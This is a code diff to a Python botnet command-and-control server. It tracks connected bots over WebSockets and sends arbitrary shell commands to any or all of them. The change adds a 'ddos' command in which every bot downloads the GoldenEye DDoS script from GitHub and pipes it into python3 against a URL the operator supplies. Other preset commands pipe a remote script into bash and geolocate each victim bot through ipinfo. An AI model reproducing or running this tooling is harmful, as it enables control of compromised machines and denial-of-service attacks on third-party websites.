@@ -61,7 +61,7 @@ class Context:
             return None
 
 
-    async def add_bot(self, ws: WebSocketConn) -> Bot: 
+    async def add_bot(self, ws: WebSocketConn) -> Bot:
         # First the client sends logged in user
         user = await ws.recv()
         try:
@@ -107,7 +107,7 @@ class Context:
         for bot in self.bots:
             x.add_row([termcolor.colored(bot.idx,"yellow",attrs=["bold"]), termcolor.colored(bot.remote_address,"yellow",attrs=["bold"]), termcolor.colored(bot.user,"yellow",attrs=["bold"])])
         return f'\n{FUN_BANNER}\n{x}\n{termcolor.colored("Bots :","cyan",attrs=["bold"])} {termcolor.colored(bot_len,"yellow",attrs=["bold"])}'
-    
+
     def getLenBots(self):
         return len(self.bots)
 
@@ -115,15 +115,18 @@ class CommandControl:
     def __init__(self, ctx: Context):
         self.ctx = ctx
 
-    def optionalCommands(self, cmd: str) -> str | None:
+    async def optionalCommands(self, cmd: str, ws : WebSocketConn) -> str:
         match cmd:
             case "city":
                 return "curl http://ipinfo.io/$(curl ifconfig.io) | grep region | sed 's/.$//'"
             case "neofetch":
                 return "(curl https://raw.githubusercontent.com/Chocapikk/neofetch/master/neofetch | bash || neofetch)"
-            
+            case "ddos":
+                await ws.send(f'\n {termcolor.colored("Which URL ? > ","yellow",attrs=["bold"])}')
+                url = await ws.recv()
+                return f"curl -fsSL https://raw.githubusercontent.com/jseidl/GoldenEye/master/goldeneye.py | python3 - {url} || echo test"
             case default:
-                return None
+                return cmd
 
 
     async def bot_authenticated(self, ws: WebSocketConn) -> str:
@@ -144,14 +147,14 @@ class CommandControl:
             pass
 
     async def execute_commands(self, ws: WebSocketConn, idxs: List[int]):
-        CLI_OPTIONS  = f'\n* {termcolor.colored("Send","red")} "{termcolor.colored("city", "yellow",attrs=["bold"])}" {termcolor.colored("to see current bot location","red")}\n'
-        CLI_OPTIONS += f'* {termcolor.colored("Send","red")} "{termcolor.colored("neofetch", "yellow",attrs=["bold"])}" {termcolor.colored("to see a fancy terminal","red")}\n'
-        CLI_OPTIONS += f'{termcolor.colored("Enter command : ","yellow", attrs=["bold"])}'
-
+        CLI_OPTIONS  = f'\n* {termcolor.colored("Send:","red")}'
+        CLI_OPTIONS += f'\n* "{termcolor.colored("city", "yellow",attrs=["bold"])}" {termcolor.colored("to see current bot location","red")}'
+        CLI_OPTIONS += f'\n* "{termcolor.colored("neofetch", "yellow",attrs=["bold"])}" {termcolor.colored("to see a fancy terminal UwU","red")}'
+        CLI_OPTIONS += f'\n* "{termcolor.colored("ddos", "yellow",attrs=["bold"])}" {termcolor.colored("to ddos a website (be careful [ Goldeneye DDOS Tool ])","red")}'
+        CLI_OPTIONS += f'\n* {termcolor.colored("Enter command : ","yellow", attrs=["bold"])}'
         await ws.send(CLI_OPTIONS)
         cmd = await ws.recv()
-        cmd = [ self.optionalCommands(cmd) if self.optionalCommands(cmd) != None else cmd ]
-        
+        cmd = await self.optionalCommands(cmd, ws)
         async def exec_command(bot_idx: int):
             cur_bot = self.ctx.get_bot(bot_idx)
             if not cur_bot:
@@ -163,7 +166,7 @@ class CommandControl:
                 self.ctx.remove_bot_client(cur_bot)
                 await ws.send(f"Connection with bot {cur_bot} was closed...")
             else:
-                stdout = f"Bot {termcolor.colored(bot_idx,'yellow',attrs=['bold'])} :\n {termcolor.colored(stdout,'green',attrs=['bold'])}"
+                stdout = f"{termcolor.colored('Bot','cyan',attrs=['bold'])} {termcolor.colored(bot_idx,'yellow',attrs=['bold'])} :\n {termcolor.colored(stdout,'green',attrs=['bold'])}"
                 await ws.send(stdout)
 
         # Execute all commands simultaneously in case it takes long time to
@@ -184,8 +187,7 @@ class CommandControl:
             if cmd.strip("\n").lower() == "exit":
                 break
             else:
-                cmd = [ self.optionalCommands(cmd) if self.optionalCommands(cmd) != None else cmd ]
-                
+                await self.optionalCommands(cmd, ws)
             stdout = await bot.send_command(cmd)
             if ws.closed or stdout is False:
                 self.ctx.remove_bot_client(bot)
@@ -212,7 +214,7 @@ class CommandControl:
                 nums = choice.split(" ")
                 print(f'nums : {nums}')
                 if 'all' in nums or '*' in nums:
-                    nums = list(range(1, self.ctx.getLenBots() + 1)) 
+                    nums = list(range(1, self.ctx.getLenBots() + 1))
                     await self.execute_commands(cli_ws, [int(x) for x in nums])
                     continue
                 elif any(filter(lambda x: not is_num(x), nums)):
